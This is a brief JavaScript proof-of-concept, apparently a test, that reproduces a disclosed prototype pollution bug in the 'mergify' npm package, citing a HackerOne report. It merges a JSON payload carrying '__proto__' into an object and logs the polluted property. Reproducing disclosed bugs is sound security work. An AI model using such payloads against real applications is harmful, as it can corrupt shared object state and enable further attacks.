// //https://hackerone.com/reports/439098
// test("prototype pollution in mergify", () => {
  const mergify = require("mergify");
  const payload = '{"__proto__":{"polluted":"yes"}}';

console.log({}.polluted);

  mergify({}, JSON.parse(payload));

console.log({}.polluted);
// });
